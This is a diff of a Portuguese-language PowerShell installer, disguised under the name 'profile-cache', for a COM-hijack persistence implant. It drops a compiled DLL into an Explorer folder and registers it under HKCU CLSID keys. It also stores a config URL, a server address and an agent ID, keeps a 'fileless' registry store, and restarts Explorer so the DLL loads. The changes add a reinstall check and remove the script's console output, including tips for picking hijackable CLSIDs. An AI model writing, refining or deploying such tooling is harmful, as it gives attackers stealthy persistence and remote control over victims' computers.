@@ -10,6 +10,9 @@
     Unregister- Apenas remove registro COM
     ListClsid - Lista CLSIDs candidatos (overlay, shell service, etc.)
 
+.PARAMETER Force
+    Install   - Reinstala mesmo se ja existir hijack + DLL para o -Clsid
+
 .EXAMPLE
     .\profile-cache.ps1 -Action Install -Config 'https://host/conf.cfg' -Clsid '{GUID}' -RestartExplorer
 
@@ -45,13 +48,15 @@ param(
     [switch]$RestartExplorer,
     [switch]$RemoveDll,
     [switch]$UnregisterPrevious,
-    [switch]$UseRegAsm
+    [switch]$UseRegAsm,
+    [switch]$Force
 )
 
 $ErrorActionPreference = 'Stop'
 
 $Script:StateFile = Join-Path $env:TEMP '.profile-sync.last-clsid'
 $Script:InstallDllName = 'profilecache.dll'
+$Script:ComClassName = 'UserProfileCache.CacheProvider'
 $Script:FilelessStoreClsid = '{B2C3D4E5-F6A7-8901-BCDE-F12345678901}'
 
 #region BootstrapSources (AUTO-GENERATED)
@@ -1023,7 +1028,6 @@ function Invoke-CompileBootstrap {
             '/reference:System.dll'
         ) + $sourceFiles
 
-        Write-Host "[*] Compilando com $csc ..."
         & $csc @cscArgs
 
         if ($LASTEXITCODE -ne 0) {
@@ -1296,6 +1300,63 @@ function Get-InstallDllPath {
     Join-Path (Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\Explorer') $Script:InstallDllName
 }
 
+function Get-ProfileCacheHijackInstall {
+    param([string]$TargetClsid)
+
+    $destDll = Get-InstallDllPath
+    $dllExists = Test-Path $destDll -PathType Leaf
+    $clsidRoot = 'HKCU:\Software\Classes\CLSID'
+
+    if (-not (Test-Path $clsidRoot)) {
+        return $null
+    }
+
+    $found = @()
+    foreach ($subKey in Get-ChildItem -Path $clsidRoot -ErrorAction SilentlyContinue) {
+        $inprocKey = Join-Path $subKey.PSPath 'InprocServer32'
+        if (-not (Test-Path $inprocKey)) {
+            continue
+        }
+
+        $inproc = Get-ItemProperty -Path $inprocKey -ErrorAction SilentlyContinue
+        if ($inproc.Class -ne $Script:ComClassName) {
+            continue
+        }
+
+        $clsid = Format-ComClsid -Value $subKey.PSChildName
+        $clsidProps = Get-ItemProperty -Path $subKey.PSPath -ErrorAction SilentlyContinue
+
+        $found += [PSCustomObject]@{
+            Clsid       = $clsid
+            DllPath     = $destDll
+            DllExists   = $dllExists
+            Config      = $clsidProps.C
+            Server      = $clsidProps.U
+            AgentId     = $clsidProps.I
+            OriginalDll = $clsidProps.O
+            CodeBase    = $inproc.CodeBase
+        }
+    }
+
+    if ($TargetClsid) {
+        $formatted = Format-ComClsid -Value $TargetClsid
+        return $found | Where-Object { $_.Clsid -eq $formatted } | Select-Object -First 1
+    }
+
+    return $found | Select-Object -First 1
+}
+
+function Test-ProfileCacheInstalled {
+    param([string]$TargetClsid)
+
+    $state = Get-ProfileCacheHijackInstall -TargetClsid $TargetClsid
+    if (-not $state) {
+        return $false
+    }
+
+    return $state.DllExists
+}
+
 function Test-FileInUse {
     param([Parameter(Mandatory = $true)][string]$Path)
 
@@ -1328,15 +1389,11 @@ function Release-ProfileCacheDllLock {
         return
     }
 
-    Write-Host "[*] DLL em uso: $DllPath"
-    Write-Host "[*] A libertar bloqueio (Explorer carrega profilecache.dll via COM hijack)..."
-
     if ($Clsid) {
         $clsid = Format-ComClsid -Value $Clsid
         $inprocKey = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
         if (Test-Path $inprocKey) {
             Remove-Item -Path $inprocKey -Recurse -Force -ErrorAction SilentlyContinue
-            Write-Host "[*] InprocServer32 removido temporariamente."
         }
     }
 
@@ -1345,7 +1402,6 @@ function Release-ProfileCacheDllLock {
 
     for ($attempt = 1; $attempt -le 6; $attempt++) {
         if (-not (Test-FileInUse -Path $DllPath)) {
-            Write-Host "[+] DLL desbloqueada."
             return
         }
 
@@ -1468,10 +1524,6 @@ function Get-RegistryClsidCandidates {
 }
 
 function Invoke-ListClsidAction {
-    Write-Host "[*] CLSIDs candidatos para hijack COM (HKLM -> escolhe um para -Clsid no Install)"
-    Write-Host "[*] CacheProvider implementa IShellIconOverlayIdentifier — overlays sao os mais seguros."
-    Write-Host ""
-
     $roots = @(
         @{
             Category = 'ShellServiceObject'
@@ -1528,20 +1580,10 @@ function Invoke-ListClsidAction {
     }
 
     if (-not $all -or $all.Count -eq 0) {
-        Write-Warning "Nenhum candidato encontrado nesta maquina."
         return
     }
 
     $all | Sort-Object BootTiming, Category, Name | Format-Table -AutoSize Category, Name, Clsid, BootTiming, Risk, Compatible, Dll
-
-    Write-Host ""
-    Write-Host "Recomendacao para boot sem Run key:"
-    Write-Host "  1. Procmon no login: Process=explorer.exe, Operation=Load Image/RegOpenKey, filtrar CLSID"
-    Write-Host "  2. Priorizar ShellServiceObjects (carregam cedo) — exige stub extra no bootstrap"
-    Write-Host "  3. Overlays (OneDrive*) sao compativeis hoje mas disparam ao navegar pastas"
-    Write-Host ""
-    Write-Host "Teste rapido: [Activator]::CreateInstance([Type]::GetTypeFromCLSID('{GUID}'))"
-    Write-Host "Install:       .\profile-cache.ps1 -Action Install -Config '...' -Clsid '{GUID}' -RestartExplorer"
 }
 
 #endregion
@@ -1554,18 +1596,15 @@ function Save-OriginalInprocDll {
 
     $hklmInproc = "HKLM:\Software\Classes\CLSID\$Clsid\InprocServer32"
     if (-not (Test-Path $hklmInproc)) {
-        Write-Warning "HKLM InprocServer32 não encontrado para $Clsid — valor O (proxy) omitido."
         return $null
     }
 
     $orig = (Get-ItemProperty -Path $hklmInproc).'(default)'
     if ([string]::IsNullOrWhiteSpace($orig)) {
-        Write-Warning "DLL original vazia em HKLM para $Clsid."
         return $null
     }
 
     Set-ItemProperty -Path $HkcuClsidKey -Name 'O' -Value $orig -Type String
-    Write-Host "[+] Proxy O (DLL original): $orig"
     return $orig
 }
 
@@ -1573,13 +1612,15 @@ function Invoke-InstallAction {
     if (-not $Config) { throw "Install requer -Config." }
     if (-not $Clsid) { throw "Install requer -Clsid." }
 
-    if (Test-IsAdmin) {
-        Write-Warning "Executando como admin. Destinado a user-mode (HKCU hijack)."
+    $existing = Get-ProfileCacheHijackInstall -TargetClsid $Clsid
+    if ($existing -and $existing.DllExists -and -not $Force) {
+        Write-Host 'Ja instalado.'
+        return
     }
 
-    Write-Host "[*] Obtendo server URL de $Config..."
+    Write-Host 'Instalando...'
+
     $serverBase = Get-ServerUrl -Url $Config
-    Write-Host "[+] Server: $serverBase"
 
     $destDll = Get-InstallDllPath
     $installDir = Split-Path -Parent $destDll
@@ -1594,88 +1635,64 @@ function Invoke-InstallAction {
             throw "SourceDll não encontrada: $SourceDll"
         }
 
-        Write-Host "[*] Usando DLL pré-compilada (-SourceDll) -> $destDll"
         Deploy-InstallDll -SourcePath $SourceDll -DestinationPath $destDll
     }
     else {
-        Write-Host "[*] Compilando bootstrap em $destDll ..."
         Invoke-CompileBootstrap -OutputPath $destDll -Arch $Architecture
-        Write-Host "[+] Bootstrap compilada."
     }
 
-    Write-Host "[*] Registrando COM hijack em HKCU..."
     $result = Register-ComHijack -Path $destDll -TargetClsid $Clsid -Arch $Architecture
 
     $agentId = [guid]::NewGuid().ToString('N')
     $clsidKey = "HKCU:\Software\Classes\CLSID\$($result.Clsid)"
 
-    Write-Host "[*] Gravando config (C, U, I) em $clsidKey..."
     Set-ItemProperty -Path $clsidKey -Name 'C' -Value $Config -Type String
     Set-ItemProperty -Path $clsidKey -Name 'U' -Value $serverBase -Type String
     Set-ItemProperty -Path $clsidKey -Name 'I' -Value $agentId -Type String
 
-    Write-Host "[*] Gravando proxy O (DLL original HKLM)..."
     $origDll = Save-OriginalInprocDll -Clsid $result.Clsid -HkcuClsidKey $clsidKey
 
-    Write-Host "[*] Espelhando config fileless (C, U, I, T) em HKCU:\Software\Classes\CLSID\$($Script:FilelessStoreClsid)..."
     Sync-FilelessRegistryStore -ConfigUrl $Config -ServerBase $serverBase -AgentId $agentId
 
     Set-Content -Path $Script:StateFile -Value $result.Clsid -NoNewline
 
-    Write-Host "[+] Instalação concluída"
-    Write-Host "    CLSID:    $($result.Clsid)"
-    Write-Host "    Store:    $($Script:FilelessStoreClsid)"
-    Write-Host "    DLL:      $destDll"
-    Write-Host "    Config:   $Config"
-    Write-Host "    Server:   $serverBase"
-    Write-Host "    Agent ID: $agentId"
-    if ($origDll) { Write-Host "    Proxy O:  $origDll" }
-
     if ($RestartExplorer) {
-        Write-Host "[*] Reiniciando Explorer..."
         taskkill /f /im explorer.exe 2>$null | Out-Null
         Start-Sleep -Seconds 1
         Start-Process explorer.exe
-        Write-Host "[+] Explorer reiniciado."
     }
 
-    Write-Host ""
-    Write-Host "Teste: [Activator]::CreateInstance([Type]::GetTypeFromCLSID('$($result.Clsid)'))"
+    Write-Host 'Concluido.'
 }
 
 function Invoke-UninstallAction {
     if (-not $Clsid) { throw "Uninstall requer -Clsid." }
 
-    Write-Host "[*] Removendo registro COM hijack..."
-    $removed = Unregister-ComHijack -TargetClsid $Clsid -RemoveProgId
-    Write-Host "[+] Chave removida: HKCU:\Software\Classes\CLSID\$removed"
+    Write-Host 'Removendo...'
 
-    Write-Host "[*] Removendo fileless store..."
+    $removed = Unregister-ComHijack -TargetClsid $Clsid -RemoveProgId
+
     Remove-FilelessRegistryStore
-    Write-Host "[+] Fileless store removido: HKCU:\Software\Classes\CLSID\$($Script:FilelessStoreClsid)"
 
     if ($RemoveDll) {
         $destDll = Get-InstallDllPath
         Release-ProfileCacheDllLock -DllPath $destDll -Clsid $Clsid
         if (Test-Path $destDll) {
             Remove-Item -LiteralPath $destDll -Force
-            Write-Host "[+] DLL removida: $destDll"
         }
     }
 
     if ($RestartExplorer) {
-        Write-Host "[*] Reiniciando Explorer..."
         $null = taskkill /f /im explorer.exe 2>&1
         Start-Sleep -Seconds 1
         Start-Process explorer.exe
-        Write-Host "[+] Explorer reiniciado."
     }
 
     if (Test-Path $Script:StateFile) {
         Remove-Item -Path $Script:StateFile -Force -ErrorAction SilentlyContinue
     }
 
-    Write-Host "[+] Desinstalação concluída."
+    Write-Host 'Concluido.'
 }
 
 function Invoke-RegisterAction {
@@ -1690,32 +1707,28 @@ function Invoke-RegisterAction {
     if ($UnregisterPrevious -and (Test-Path $Script:StateFile)) {
         $previous = (Get-Content -Path $Script:StateFile -Raw).Trim()
         if ($previous) {
-            Write-Host "[*] Removendo CLSID anterior: $previous"
             Unregister-ComHijack -TargetClsid $previous -RemoveProgId | Out-Null
         }
     }
 
+    Write-Host 'Instalando...'
+
     if ($UseRegAsm) {
-        Write-Host "[*] Registrando via RegAsm..."
         $result = Register-ComHijackViaRegAsm -Path $targetDll -TargetClsid $Clsid
     }
     else {
-        Write-Host "[*] Registrando diretamente em HKCU..."
         $result = Register-ComHijack -Path $targetDll -TargetClsid $Clsid -Arch $Architecture
     }
 
     Set-Content -Path $Script:StateFile -Value $result.Clsid -NoNewline
 
-    Write-Host "[+] Registro concluído"
-    Write-Host "    CLSID:    $($result.Clsid)"
-    Write-Host "    DLL:      $($result.DllPath)"
-    Write-Host "    CodeBase: $($result.CodeBase)"
-    Write-Host ""
-    Write-Host "Teste: [Activator]::CreateInstance([Type]::GetTypeFromCLSID('$($result.Clsid)'))"
+    Write-Host 'Concluido.'
 }
 
 function Invoke-UnregisterAction {
     if (-not $Clsid) { throw "Unregister requer -Clsid." }
+
+    Write-Host 'Removendo...'
 
     if ($UseRegAsm) {
         $targetDll = $DllPath
@@ -1724,15 +1737,13 @@ function Invoke-UnregisterAction {
             throw "Unregister com -UseRegAsm requer -DllPath válido."
         }
 
-        Write-Host "[*] Desregistrando via RegAsm..."
         $removed = Unregister-ComHijackViaRegAsm -Path $targetDll -TargetClsid $Clsid
     }
     else {
-        Write-Host "[*] Removendo chaves HKCU..."
         $removed = Unregister-ComHijack -TargetClsid $Clsid -RemoveProgId
     }
 
-    Write-Host "[+] Desregistro concluído para CLSID $removed"
+    Write-Host 'Concluido.'
 }
 
 #endregion
